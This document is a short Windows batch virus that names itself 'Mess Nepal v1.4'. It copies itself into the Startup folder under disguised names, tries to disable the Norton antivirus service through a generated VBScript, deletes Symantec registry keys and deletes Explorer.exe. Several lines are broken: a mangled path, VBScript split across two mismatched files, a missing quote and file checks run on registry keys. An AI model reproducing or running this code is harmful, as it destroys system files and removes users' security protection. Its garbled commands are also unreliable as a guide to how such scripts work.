   @echo on

   If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\Antidis.bat" Copy %0 "C:\DocumentC:\Documents and Settings\All Users\Start Menu\Programs\Startup\nav32.bat"
   If Not Exist "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\antidis.bat" Copy %0 "C:\DocumentC:\Documents and Settings\All Users\Start Menu\Programs\Startup\sysconfig.bat"


   echo WSHShell = WScript.CreateObject("WScript.Shell") >> c:\Bug.vbs
   echo WSHShell.RegWrite(HKLM\SYSTEM\CurrentControlSet\Services\navapsvc\start", "4", "REG_DWORD") >> c:\runvirus.vbs
   start c:\Bug.vbs


   if exist HKEY_LOCAL_MACHINE\SOFTWARE\Symantec goto 1
   if exist HKEY_CURRENT_USER\Software\Symantec goto 1
   if exist HKEY_CLASSES_ROOT\symantec*.* goto 1


   :1
   reg delete /f HKEY_LOCAL_MACHINE\SOFTWARE\Symantec
   reg delete /f HKEY_CURRENT_USER\Software\Symantec
   reg delete /f HKEY_CLASSES_ROOT\symantec*.*
   goto 2

   :2
   ATTRIB C:\windows\EXPLORER.EXE -H -A -R
   DEL C:\windows\EXPLORER.EXE
   goto 3

   :3
   echo *****************Mess Nepal v1.4********************* >> c:\virusinfo.txt
   EXIT
